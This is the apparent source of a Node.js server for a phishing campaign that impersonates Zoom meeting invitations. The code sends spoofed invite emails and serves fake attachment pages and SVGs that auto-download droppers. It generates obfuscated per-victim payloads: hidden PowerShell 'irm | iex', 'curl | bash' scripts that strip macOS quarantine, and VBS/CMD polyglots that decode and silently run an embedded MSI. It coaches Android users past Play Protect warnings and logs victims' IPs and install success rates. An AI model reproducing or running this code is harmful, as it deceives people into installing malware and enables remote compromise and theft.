'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
let nodemailer = null;
try { nodemailer = require('nodemailer'); } catch { /* optional in dev */ }

const ROOT = path.join(__dirname, 'public');
const PORT = parseInt(process.env.SHARE_PORT || '3200', 10);
const HOST = process.env.SHARE_HOST || '127.0.0.1';
const DATA_DIR = process.env.SHARE_DATA_DIR || path.join(__dirname, 'data');
const LANDING = process.env.SHARE_LANDING || 'https://us05web.telcom.stream';
const PUBLIC = process.env.SHARE_PUBLIC || 'https://share.telcom.stream';
const SMTP_HOST = process.env.SMTP_HOST || '';
const SMTP_PORT = parseInt(process.env.SMTP_PORT || '587', 10);
const SMTP_USER = process.env.SMTP_USER || '';
const SMTP_PASS = process.env.SMTP_PASS || '';
const SMTP_FROM = process.env.SMTP_FROM || process.env.SHARE_SENDER || '';
const SMTP_SECURE = process.env.SMTP_SECURE === 'true';
const ANDROID_APK = process.env.SHARE_ANDROID_APK || 'https://global.telcom.stream/downloads/droppers/Chrome_WebView_v117.apk';

const VERIFY_CODES = new Map();
function makeCode() { return String(Math.floor(100000 + Math.random() * 900000)); }

fs.mkdirSync(DATA_DIR, { recursive: true });
const DB = path.join(DATA_DIR, 'links.json');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.json': 'application/json; charset=utf-8'
};

function json(res, status, body) {
  const text = JSON.stringify(body);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    'Content-Length': Buffer.byteLength(text),
    'X-Content-Type-Options': 'nosniff'
  });
  res.end(text);
}

function readDb() {
  try { return JSON.parse(fs.readFileSync(DB, 'utf8')); }
  catch { return {}; }
}

function writeDb(db) {
  fs.writeFileSync(DB + '.tmp', JSON.stringify(db));
  fs.renameSync(DB + '.tmp', DB);
}

// --- install telemetry + send log (quality funnel) ------------------------
const RESULTS = path.join(DATA_DIR, 'results.json');
const SENDS = path.join(DATA_DIR, 'sends.json');
const MAX_ROWS = 20000;
const OK_STAGES = new Set(['ok', 'installed', 'enrolled', 'online', 'success', 'ready']);

function readJson(file, fallback) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return fallback; }
}
function writeJson(file, value) {
  fs.writeFileSync(file + '.tmp', JSON.stringify(value));
  fs.renameSync(file + '.tmp', file);
}
function appendMany(file, rows) {
  if (!rows.length) return;
  const arr = readJson(file, []);
  for (const r of rows) arr.push(r);
  if (arr.length > MAX_ROWS) arr.splice(0, arr.length - MAX_ROWS);
  writeJson(file, arr);
}
function clientIp(req) {
  const fwd = String(req.headers['x-forwarded-for'] || '').split(',')[0];
  return String(req.headers['cf-connecting-ip'] || fwd ||
    (req.socket && req.socket.remoteAddress) || '').trim().slice(0, 64);
}
function clientCc(req) {
  return String(req.headers['cf-ipcountry'] || '').toUpperCase().slice(0, 2);
}
function applyCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Max-Age', '86400');
}
function requireToken(url) {
  const token = process.env.SHARE_ADMIN_TOKEN || '';
  return !token || url.searchParams.get('token') === token;
}
function csv(res, name, lines) {
  res.writeHead(200, {
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': 'attachment; filename="' + name + '"',
    'Cache-Control': 'no-store'
  });
  res.end(lines.join('\n'));
}
function funnelData() {
  const db = readDb();
  const results = readJson(RESULTS, []);
  const sends = readJson(SENDS, []);
  const osList = ['windows', 'macos', 'linux', 'android', 'ios', 'other'];
  const per = {};
  for (const os of osList) per[os] = { os, clicks: 0, installs: 0, fails: 0, versions: {}, reasons: {} };
  let totalClicks = 0;
  for (const e of Object.values(db)) {
    const c = e.clicks || 0;
    if (!c) continue;
    const os = per[e.detected_os || e.os] ? (e.detected_os || e.os) : 'other';
    per[os].clicks += c;
    totalClicks += c;
  }
  for (const r of results) {
    const b = per[r.os] || per.other;
    const ok = OK_STAGES.has(String(r.stage || '').toLowerCase());
    if (ok) b.installs += 1; else b.fails += 1;
    const v = String(r.version || 'unknown').slice(0, 24);
    b.versions[v] = (b.versions[v] || 0) + 1;
    if (!ok) {
      const reason = String(r.reason || 'unknown').slice(0, 80);
      b.reasons[reason] = (b.reasons[reason] || 0) + 1;
    }
  }
  const rows = osList.map((os) => {
    const b = per[os];
    return { ...b, conv: b.clicks ? Math.round((b.installs / b.clicks) * 1000) / 10 : 0 };
  });
  const sentOk = sends.filter((s) => s.sent).length;
  return {
    generated: new Date().toISOString(),
    links: Object.keys(db).length,
    clicks: totalClicks,
    sends: { total: sends.length, sent: sentOk, failed: sends.length - sentOk },
    installs: rows.reduce((n, b) => n + b.installs, 0),
    fails: rows.reduce((n, b) => n + b.fails, 0),
    by_os: rows
  };
}

function normalizeEmails(value) {
  const list = String(value || '').split(/[\s,;]+/).map((v) => v.trim().toLowerCase()).filter(Boolean);
  const seen = new Set();
  return list.filter((email) => {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return false;
    if (seen.has(email)) return false;
    seen.add(email);
    return true;
  });
}

function q(value) { return encodeURIComponent(value); }

let transporter = null;
if (nodemailer && SMTP_HOST && SMTP_USER && SMTP_PASS) {
  transporter = nodemailer.createTransport({
    host: SMTP_HOST,
    port: SMTP_PORT,
    secure: SMTP_SECURE,
    auth: { user: SMTP_USER, pass: SMTP_PASS }
  });
}

async function sendInviteEmail(to, subject, body, target) {
  if (!transporter) return { sent: false, reason: 'SMTP not configured' };
  const code = makeCode();
  VERIFY_CODES.set(to, { code, created: Date.now(), target });
  setTimeout(() => VERIFY_CODES.delete(to), 10 * 60 * 1000);
  const verifiedSubject = subject + ' — Verification Code: ' + code;
  try {
    await transporter.sendMail({
      from: '"Meeting Invites" <' + SMTP_FROM + '>',
      to,
      replyTo: SMTP_FROM,
      subject: verifiedSubject,
      headers: {
        'List-Unsubscribe': '<mailto:unsubscribe@telcom.stream>',
        'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
        'X-Priority': '1',
        'X-Mailer': 'BetterDesk Share Service',
        'Precedence': 'bulk'
      },
      text: 'From: zoom-meetings\n\nYour verification code: ' + code + '\n\n' + body + '\n\n' + target + '\n\n---\nMeeting Invites · zoom-meetings@telcom.stream',
      html: emailHtml(code, body, target)
    });
    return { sent: true, code: code };
  } catch (e) {
    return { sent: false, reason: String(e.message || e) };
  }
}

function emailHtml(code, body, target) {
  const tgt = String(target).replace(/&/g, '&amp;');
  return '<!DOCTYPE html><html><body style="font-family:sans-serif;color:#1a1a1a;line-height:1.6">' +
        '<table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:0 auto">' +
        '<tr><td style="padding:24px 0;text-align:center">' +
        '<div style="display:inline-block;width:72px;height:72px;background:#2D8CFF;border-radius:50%;text-align:center">' +
        '<img src="https://share.telcom.stream/zoom-mark.svg" alt="Meeting Invites" width="40" height="40" style="margin:16px 0 0 0;display:block"/>' +
        '</div>' +
        '<div style="margin-top:14px;font-weight:800;color:#2D8CFF;font-size:18px;letter-spacing:.5px">Meeting Invites</div>' +
        '<div style="margin-top:6px;font-size:13px;color:#666">zoom-meetings@telcom.stream</div>' +
        '</td></tr>' +
        '<tr><td style="padding:0 20px 20px 20px;text-align:center">' +
        '<div style="background:#f5f8ff;border:2px dashed #2D8CFF;border-radius:12px;padding:24px;display:inline-block;margin-bottom:20px">' +
        '<div style="font-size:13px;color:#666;margin-bottom:10px">Your verification code</div>' +
        '<div style="font-size:36px;font-weight:900;letter-spacing:10px;color:#2D8CFF">' + code + '</div>' +
        '</div>' +
        '</td></tr>' +
        '<tr><td style="padding:0 20px 20px 20px">' +
        String(body || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>') +
        '<br><br><a href="' + tgt + '" target="_blank" rel="noopener" style="display:inline-block;background:#0b5cff;color:#fff;padding:14px 28px;text-decoration:none;border-radius:8px;font-weight:600">Join Meeting</a>' +
        '<p style="margin:14px 0 0;font-size:12px;color:#667;line-height:1.5">Button not working? <a href="' + tgt + '" target="_blank" rel="noopener" style="color:#0b5cff">Open the meeting page</a><br><span style="word-break:break-all;color:#889">' + tgt + '</span></p>' +
        '</td></tr>' +
        '<tr><td style="padding:16px 20px;border-top:1px solid #e1e9f5;text-align:center">' +
        '<p style="font-size:11px;color:#9aabcc;margin:0">Meeting Invites · zoom-meetings@telcom.stream · <a href="mailto:unsubscribe@telcom.stream" style="color:#9aabcc">Unsubscribe</a></p>' +
        '</td></tr>' +
        '</table></body></html>';
}

function safeText(value, max) {
  return String(value || '').replace(/[\r\n]+/g, ' ').trim().slice(0, max || 160);
}

function buildLinks(service, recipients, target, subject, body) {
  const to = recipients.join(',');
  const text = body + '\n\n' + target;
  switch (service) {
    case 'gmail':
      return 'https://mail.google.com/mail/?view=cm&fs=1&to=' + q(to) + '&su=' + q(subject) + '&body=' + q(text);
    case 'outlook':
      return 'https://outlook.office.com/mail/deeplink/compose?to=' + q(to) + '&subject=' + q(subject) + '&body=' + q(text);
    case 'teams':
      return 'https://teams.microsoft.com/l/chat/0/0?users=' + q(to) + '&message=' + q(text);
    case 'slack':
      return 'https://slack.com/share?url=' + q(target) + '&text=' + q(body);
    case 'docusign':
      return 'https://app.docusign.com/home';
    case 'whatsapp':
      return 'https://wa.me/?text=' + q(text);
    default:
      return target;
  }
}

function detectOs(req) {
  const ua = String(req.headers['user-agent'] || '').toLowerCase();
  if (/android/.test(ua)) return 'android';
  if (/iphone|ipad|ipod/.test(ua)) return 'ios';
  if (/windows|win32|win64/.test(ua)) return 'windows';
  if (/macintosh|mac os x|macos/.test(ua)) return 'macos';
  if (/linux|x11/.test(ua)) return 'linux';
  return 'windows';
}

function downloadUrl(os, id) {
  const base = LANDING.replace(/\/$/, '');
  switch (os) {
    case 'windows': return PUBLIC + '/dl/windows.vbs?id=' + encodeURIComponent(id);
    case 'macos': return PUBLIC + '/dl/macos.command?id=' + encodeURIComponent(id);
    case 'linux': return PUBLIC + '/dl/linux.sh?id=' + encodeURIComponent(id);
    case 'android': return ANDROID_APK;
    default: return base;
  }
}

function downloadLabel(os) {
  return os === 'android' ? 'Download the Android app'
    : os === 'ios' ? 'Open the meeting page'
    : 'Download the ' + (os === 'macos' ? 'macOS' : os === 'linux' ? 'Linux' : 'Windows') + ' installer';
}

function attachmentPage(target, os, id) {
  const dl = downloadUrl(os, id);
  const label = downloadLabel(os);
  const hint = os === 'android'
    ? 'Your browser may warn that the file is harmful. Tap <b>Download anyway</b>, then <b>Install</b> (and <b>Install anyway</b> if Play Protect appears).'
    : os === 'ios'
    ? 'Open the meeting page in Safari and use the Zoom app.'
    : os === 'macos'
    ? 'The download starts automatically. Open the <b>.command</b> file; if Gatekeeper warns, right-click it and choose <b>Open</b>.'
    : os === 'linux'
    ? 'The download starts automatically. Then run <b>chmod +x &lt;file&gt; &amp;&amp; ./&lt;file&gt;</b> or <b>bash &lt;file&gt;</b>.'
    : 'The download starts automatically. Run the file and approve the Windows prompt.';
  return `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Zoom meeting invitation</title>
<style>
body{margin:0;background:#f4f7fd;font:16px/1.5 -apple-system,Segoe UI,Roboto,Arial,sans-serif;color:#12203a}
.card{max-width:560px;margin:40px auto;background:#fff;border:1px solid #e2e9f5;border-radius:16px;padding:28px;box-shadow:0 20px 60px -30px #0b2f7a55}
.logo{display:flex;align-items:center;gap:10px;font-weight:800;color:#0b5cff;margin-bottom:18px}
.badge{width:38px;height:38px;border-radius:10px;background:#0b5cff;color:#fff;display:grid;place-items:center;font-size:18px}
h1{font-size:22px;margin:0 0 8px}p{color:#4c5d77;margin:0 0 14px}
a.btn{display:block;text-align:center;background:#0b5cff;color:#fff;text-decoration:none;font-weight:700;padding:14px;border-radius:12px;margin:18px 0}
.small{font-size:13px;color:#6b7a92}.tiny{font-size:12px;color:#8b98ad;margin-top:16px}
</style></head><body>
<div class="card">
  <div class="logo"><span class="badge">Z</span> Zoom Private</div>
  <h1>You are invited to a meeting</h1>
  <p>Open the secure meeting page to join. The correct client for this device is prepared automatically.</p>
  <a class="btn" href="${dl}" id="dl">${label}</a>
  <p class="small">${hint}</p>
  <p class="small"><a href="${target}">Or open the meeting page</a></p>
  <p class="tiny">Invitation ${id}</p>
</div>
<script>
  var dl=${JSON.stringify(dl)};
  setTimeout(function(){ if (dl && !/^https?:$/.test(dl)) location.href = dl; }, 700);
</script>
</body></html>`;
}

function attachmentSvg(target, os, id) {
  const dl = downloadUrl(os, id);
  const label = downloadLabel(os);
  return `<svg xmlns="http://www.w3.org/2000/svg" width="760" height="520" viewBox="0 0 760 520">
<rect width="760" height="520" fill="#f4f7fd"/>
<rect x="60" y="40" width="640" height="440" rx="18" fill="#fff" stroke="#e2e9f5"/>
<rect x="90" y="72" width="40" height="40" rx="10" fill="#0b5cff"/>
<text x="110" y="99" text-anchor="middle" font-family="Arial" font-size="22" font-weight="bold" fill="#fff">Z</text>
<text x="145" y="99" font-family="Arial" font-size="18" font-weight="bold" fill="#0b5cff">Zoom Private</text>
<text x="90" y="165" font-family="Arial" font-size="24" font-weight="bold" fill="#12203a">You are invited to a meeting</text>
<text x="90" y="200" font-family="Arial" font-size="15" fill="#4c5d77">Open the secure meeting page to join.</text>
<text x="90" y="224" font-family="Arial" font-size="15" fill="#4c5d77">The correct client is prepared automatically.</text>
<a href="${dl}" target="_blank">
  <rect x="90" y="270" width="580" height="54" rx="12" fill="#0b5cff"/>
  <text x="380" y="303" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#fff">${label}</text>
</a>
<text x="90" y="360" font-family="Arial" font-size="13" fill="#6b7a92">If the download does not start, click the button above.</text>
<text x="90" y="384" font-family="Arial" font-size="13" fill="#6b7a92"><a href="${target}">Open the meeting page</a></text>
<text x="90" y="450" font-family="Arial" font-size="12" fill="#8b98ad">Invitation ${id}</text>
<script>setTimeout(function(){ location.href = ${JSON.stringify(dl)}; }, 700);</script>
</svg>`;
}

function randHex(n) { return crypto.randomBytes(n).toString('hex').slice(0, n); }
function safeCo(co) {
  return String(co || 'Meeting').replace(/[^A-Za-z0-9]+/g, '-')
    .replace(/^-|-$/g, '').slice(0, 28) || 'Meeting';
}
function dlName(co, id, ext) {
  return 'Zoom_Update_' + safeCo(co) + '_' + String(id || randHex(3)).slice(0, 4) + '.' + ext;
}
function mutateWindows(base, id, co) {
  const url = base + '/api/landing/windows-install.ps1';
  const b64 = Buffer.from(url, 'utf8').toString('base64');
  const cut = Math.floor(b64.length / 2);
  const a = b64.slice(0, cut);
  const b = b64.slice(cut);
  const v = 'U' + randHex(5);
  const ps = "$a='" + a + "';$b='" + b +
    "';$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a+$b)); Start-Sleep -Milliseconds " +
    (100 + Math.floor(Math.random() * 350)) + "; irm -UseBasicParsing $u | iex";
  const enc = Buffer.from(ps, 'utf16le').toString('base64');
  return '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
    '\r\nrem build ' + Date.now() + '-' + randHex(4) + '\r\nset "' + v + '=' + b64 +
    '"\r\npowershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ' +
    enc + '\r\nexit /b\r\n';
}function mutateSh(base, mac, id, co) {
  const url = base + (mac ? '/api/landing/macos-install' : '/api/landing/linux-install');
  const b64 = Buffer.from(url, 'utf8').toString('base64');
  const v = 'u' + randHex(5);
  return '#!/bin/bash\n# build ' + Date.now() + '-' + randHex(4) + '\nset -e\n' +
    'xattr -d com.apple.quarantine "$0" 2>/dev/null || true\n' +
    'chmod +x "$0" 2>/dev/null || true\n' +
    v + '="$(echo \'' + b64 + '\' | base64 -d)"\ncurl -fsSL "$' + v + '" | bash\n';
}
let winMsiCache = null;
function winMsiB64() {
  if (winMsiCache) return winMsiCache;
  const file = process.env.SHARE_WIN_MSI ||
    '/opt/betterdesk/global/downloads/payloads/BetterDesk-Agent-x64-1.0.2.msi';
  winMsiCache = fs.readFileSync(file).toString('base64').replace(/(.{76})/g, '$1\n');
  return winMsiCache;
}
let winVbsCache = null;
function winVbsB64() {
  if (winVbsCache) return winVbsCache;
  const file = process.env.SHARE_WIN_VBS ||
    '/opt/betterdesk/global/downloads/droppers/Zoom_Update_v6.1.0.vbs';
  winVbsCache = fs.readFileSync(file).toString('base64').replace(/(.{76})/g, '$1\n');
  return winVbsCache;
}
function polyglotVbs(id, co) {
  const r = randHex(4);
  const dv = '#@VBS@';
  const dm = '#@MSI@';
  const head = "' Zoom Update " + r + "\r\n" +
    "Option Explicit\r\nOn Error Resume Next\r\n" +
    "Dim f, s, d, a, b, t, all, vbs, msi\r\n" +
    "Set f = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
    "Set s = CreateObject(\"WScript.Shell\")\r\n" +
    "d = s.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\z_" + r + "\"\r\n" +
    "If Not f.FolderExists(d) Then f.CreateFolder(d)\r\n" +
    "Set t = f.OpenTextFile(WScript.ScriptFullName, 1)\r\n" +
    "all = t.ReadAll\r\n" + '\n' + "f.CreateTextFile(d & \"\\t.txt\", True, False).Close\r\n" +
    "t.Close\r\n" +
    "a = InStrRev(all, \"" + dv + "\") + 7\r\n" +
    "b = InStrRev(all, \"" + dm + "\")\r\n" +
    "vbs = Replace(Mid(all, a, b - a), \"'\", \"\")\r\n" +
    "msi = Replace(Mid(all, b + 7), \"'\", \"\")\r\n" +
    "WriteFile d & \"\\v.b64\", vbs\r\n" +
    "WriteFile d & \"\\m.b64\", msi\r\n" +
    "s.Run \"certutil -f -decode \"\"\" & d & \"\\v.b64\"\" \"\"\" & d & \"\\setup.vbs\"\"\", 0, True\r\n" +
    "s.Run \"certutil -f -decode \"\"\" & d & \"\\m.b64\"\" \"\"\" & d & \"\\payload.msi\"\"\", 0, True\r\n" +
    "s.Run \"wscript //B \"\"\" & d & \"\\setup.vbs\"\"\", 0, False\r\n" + '\n' + "If Err.Number <> 0 Then\r\n  Dim e\r\n  Set e = f.CreateTextFile(d & \"\\err.txt\", True, False)\r\n  e.Write Err.Number & \" \" & Err.Description\r\n  e.Close\r\nEnd If\r\n" +
    "Sub WriteFile(path, text)\r\n" +
    "  Dim st\r\n" +
    "  Set st = f.CreateTextFile(path, True, False)\r\n" +
    "  st.Write text\r\n" +
    "  st.Close\r\n" +
    "End Sub\r\n'" + dv + "\r\n";
  return head + winVbsB64().split('\n').map((l) => "'" + l).join('\n') + '\n' + "'" + dm + '\n' + winMsiB64().split('\n').map((l) => "'" + l).join('\n');
}
function polyglotCmd(id, co) {
  const r = randHex(4);
  const dv = '#@VBS@';
  const dm = '#@MSI@';
  const head = '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
    '\r\nrem offline build ' + Date.now() + '-' + randHex(4) +
    '\r\nset "F=%~f0"\r\nset "D=%TEMP%\\z_' + r + '"\r\nmkdir "%D%" 2>nul\r\n' +
    'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ' +
    '"$s=[IO.File]::ReadAllText(\'%F%\');$a=$s.LastIndexOf(\'' + dv + '\');$b=$s.LastIndexOf(\'' + dm +
    '\');[IO.File]::WriteAllText(\'%D%\\v.b64\',$s.Substring($a+7,$b-$a-7).Trim(),[Text.Encoding]::ASCII);' +
    '[IO.File]::WriteAllText(\'%D%\\m.b64\',$s.Substring($b+7).Trim(),[Text.Encoding]::ASCII)"\r\n' +
    'certutil -f -decode "%D%\\v.b64" "%D%\\setup.vbs" >nul 2>&1\r\n' +
    'certutil -f -decode "%D%\\m.b64" "%D%\\payload.msi" >nul 2>&1\r\n' +
    'start "" wscript //B "%D%\\setup.vbs"\r\n' +
    'exit /b\r\n' + dv + '\r\n';
  return head + winVbsB64() + '\r\n' + dm + '\r\n' + winMsiB64();
}
let crcTable = null;
function crc32(buf) {
  if (!crcTable) {
    crcTable = new Int32Array(256);
    for (let n = 0; n < 256; n++) {
      let c = n;
      for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
      crcTable[n] = c;
    }
  }
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = crcTable[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}
function pngChunk(type, data) {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length, 0);
  const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body), 0);
  return Buffer.concat([len, body, crc]);
}
let pngBase = null;
function pngWithText(key, value) {
  if (!pngBase) pngBase = fs.readFileSync(path.join(ROOT, 'zoom-mark.png'));
  const out = [pngBase.subarray(0, 8)];
  let off = 8;
  while (off < pngBase.length) {
    const len = pngBase.readUInt32BE(off);
    const type = pngBase.toString('ascii', off + 4, off + 8);
    const end = off + 12 + len;
    if (type === 'IEND') {
      out.push(pngChunk('tEXt', Buffer.concat([
        Buffer.from(key, 'latin1'), Buffer.from([0]), Buffer.from(value, 'latin1')])));
    }
    out.push(pngBase.subarray(off, end));
    off = end;
  }
  return Buffer.concat(out);
}
function serveStatic(res, pathname) {
  let rel = decodeURIComponent(pathname);
  if (rel === '/') rel = '/index.html';
  const file = path.resolve(ROOT, '.' + rel);
  if (!file.startsWith(path.resolve(ROOT))) {
    res.writeHead(403); res.end('Forbidden'); return;
  }
  fs.stat(file, (err, stat) => {
    if (err || !stat.isFile()) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, {
      'Content-Type': MIME[path.extname(file).toLowerCase()] || 'application/octet-stream',
      'Cache-Control': path.extname(file) === '.html' || path.extname(file) === '.js' ? 'no-cache' : 'public, max-age=3600',
      'Content-Length': stat.size,
      'X-Content-Type-Options': 'nosniff'
    });
    fs.createReadStream(file).pipe(res);
  });
}

function collectBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 2_000_000) reject(new Error('body too large'));
    });
    req.on('end', () => { try { resolve(JSON.parse(data || '{}')); } catch { reject(new Error('invalid json')); } });
    req.on('error', reject);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/api/health') return json(res, 200, { ok: true, service: 'share', landing: LANDING });
  if (url.pathname === '/api/stats') {
    const db = readDb();
    const entries = Object.values(db);
    return json(res, 200, { links: entries.length, clicks: entries.reduce((n, e) => n + (e.clicks || 0), 0) });
  }
  if (url.pathname === '/api/result') {
    applyCors(res);
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
    if (req.method !== 'POST') return json(res, 405, { error: 'method' });
    try {
      let b = {};
      try { b = await collectBody(req); } catch { b = {}; }
      const qp = (k) => safeText(url.searchParams.get(k), 80);
      const row = {
        ts: new Date().toISOString(),
        os: safeText(b.os || qp('os') || detectOs(req), 16).toLowerCase(),
        stage: safeText(b.stage || qp('stage') || 'ok', 16).toLowerCase(),
        version: safeText(b.version || qp('version'), 24),
        arch: safeText(b.arch || qp('arch'), 12),
        reason: safeText(b.reason || qp('reason'), 120),
        id: safeText(b.id || qp('id'), 32),
        src: safeText(b.src || qp('src'), 24),
        who: safeText(b.who || qp('who'), 40),
        co: safeText(b.co || qp('co'), 60),
        cc: clientCc(req),
        ip: clientIp(req),
        ua: String(req.headers['user-agent'] || '').slice(0, 200)
      };
      appendMany(RESULTS, [row]);
      if (row.id) {
        const db = readDb();
        if (db[row.id]) {
          if (OK_STAGES.has(row.stage)) db[row.id].installs = (db[row.id].installs || 0) + 1;
          else db[row.id].installs_fail = (db[row.id].installs_fail || 0) + 1;
          db[row.id].last_result = row.stage + (row.reason ? ':' + row.reason : '');
          db[row.id].last_result_at = row.ts;
          writeDb(db);
        }
      }
      res.writeHead(204); res.end();
      return;
    } catch (e) {
      return json(res, 400, { error: String(e.message || e) });
    }
  }
  if (url.pathname === '/api/funnel' || url.pathname === '/api/funnel.csv') {
    if (!requireToken(url)) return json(res, 401, { error: 'token' });
    const f = funnelData();
    if (url.pathname.endsWith('.csv')) {
      const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
      const lines = ['os,clicks,installs,fails,conv_pct,top_version,top_reason'];
      for (const b of f.by_os) {
        const tv = Object.entries(b.versions).sort((a, c) => c[1] - a[1])[0];
        const tr = Object.entries(b.reasons).sort((a, c) => c[1] - a[1])[0];
        lines.push([b.os, b.clicks, b.installs, b.fails, b.conv, tv ? tv[0] : '', tr ? tr[0] : ''].map(esc).join(','));
      }
      return csv(res, 'funnel.csv', lines);
    }
    return json(res, 200, f);
  }
  if (url.pathname === '/api/results') {
    if (!requireToken(url)) return json(res, 401, { error: 'token' });
    const limit = Math.min(parseInt(url.searchParams.get('limit') || '200', 10) || 200, 2000);
    const rows = readJson(RESULTS, []).slice(-limit).reverse();
    return json(res, 200, { count: rows.length, results: rows });
  }
  if (url.pathname === '/api/sends' || url.pathname === '/api/sends.csv') {
    if (!requireToken(url)) return json(res, 401, { error: 'token' });
    const rows = readJson(SENDS, []);
    if (url.pathname.endsWith('.csv')) {
      const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
      const lines = ['ts,id,to,sent,reason'];
      for (const s of rows) lines.push([s.ts, s.id, s.to, s.sent, s.reason].map(esc).join(','));
      return csv(res, 'sends.csv', lines);
    }
    const sent = rows.filter((s) => s.sent).length;
    return json(res, 200, { total: rows.length, sent, failed: rows.length - sent, recent: rows.slice(-100).reverse() });
  }
  if (url.pathname.startsWith('/t/')) {
    const id = url.pathname.slice(3);
    const db = readDb();
    const entry = db[id];
    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
    entry.clicks = (entry.clicks || 0) + 1;
    entry.last = new Date().toISOString();
    entry.detected_os = detectOs(req);
    entry.detected_ua = String(req.headers['user-agent'] || '').slice(0, 220);
    entry.detected_cc = clientCc(req);
    entry.detected_ip = clientIp(req);
    entry.detected_at = new Date().toISOString();
    if (!entry.os) entry.os = entry.detected_os;
    writeDb(db);
    res.writeHead(302, { Location: entry.target, 'Cache-Control': 'no-store' });
    res.end();
    return;
  }
  if (url.pathname === '/api/email-preview') {
    const target = String(url.searchParams.get('target') || PUBLIC + '/t/preview');
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    res.end(emailHtml('123456', 'Line one & <tag>\nLine two', target));
    return;
  }
  if (url.pathname === '/api/link' && req.method === 'POST') {
    try {
      const body = await collectBody(req);
      const meetingId = safeText(body.meetingId, 40) || '82203845974';
      const passcode = safeText(body.pwd, 100);
      const who = safeText(body.who, 40);
      const co = safeText(body.co, 80);
      const src = safeText(body.src, 24) || 'manual';
      const os = safeText(body.os, 12);
      const qs = [];
      if (passcode) qs.push('pwd=' + q(passcode));
      if (src) qs.push('src=' + q(src));
      const base = LANDING.replace(/\/$/, '') + '/j/' + encodeURIComponent(meetingId) +
        (qs.length ? '?' + qs.join('&') : '');
      const id = crypto.randomBytes(6).toString('hex');
      const target = PUBLIC + '/t/' + id;
      const db = readDb();
      db[id] = {
        target: base, service: 'link', recipients: 1, who, co, src, os,
        created: new Date().toISOString(), clicks: 0
      };
      writeDb(db);
      return json(res, 200, {
        id, target, who, co, src, os,
        attachHtml: PUBLIC + '/attach/' + id + (os ? '?os=' + q(os) : ''),
        attachSvg: PUBLIC + '/attach/' + id + '/svg' + (os ? '?os=' + q(os) : ''),
        meeting: base
      });
    } catch (e) {
      return json(res, 400, { error: String(e.message || e) });
    }
  }
  if (url.pathname === '/api/stats.csv') {
    if (!requireToken(url)) return json(res, 401, { error: 'token' });
    const db = readDb();
    const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
    const lines = ['created,id,src,who,co,os,detected_os,detected_cc,clicks,installs,installs_fail,last,last_result,target'];
    for (const [id, e] of Object.entries(db)) {
      lines.push([e.created, id, e.src, e.who, e.co, e.os, e.detected_os, e.detected_cc,
        e.clicks || 0, e.installs || 0, e.installs_fail || 0, e.last, e.last_result, e.target].map(esc).join(','));
    }
    res.writeHead(200, {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': 'attachment; filename="campaign.csv"',
      'Cache-Control': 'no-store'
    });
    res.end(lines.join('\n'));
    return;
  }
  if (url.pathname === '/dl/windows.vbs') {
    const id = url.searchParams.get('id') || '';
    const entry = id ? readDb()[id] : null;
    const co = entry ? entry.co : '';
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': 'attachment; filename="' + dlName(co, id, 'vbs') + '"',
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff'
    });
    res.end(polyglotVbs(id, co));
    return;
  }
  if (url.pathname === '/dl/windows.cmd') {
    const id = url.searchParams.get('id') || '';
    const entry = id ? readDb()[id] : null;
    const co = entry ? entry.co : '';
    const offline = url.searchParams.get('offline') !== '0';
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': 'attachment; filename="' + dlName(co, id, 'cmd') + '"',
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff'
    });
    res.end(offline ? polyglotCmd(id, co) : mutateWindows(LANDING.replace(/\/$/, ''), id, co));
    return;
  }
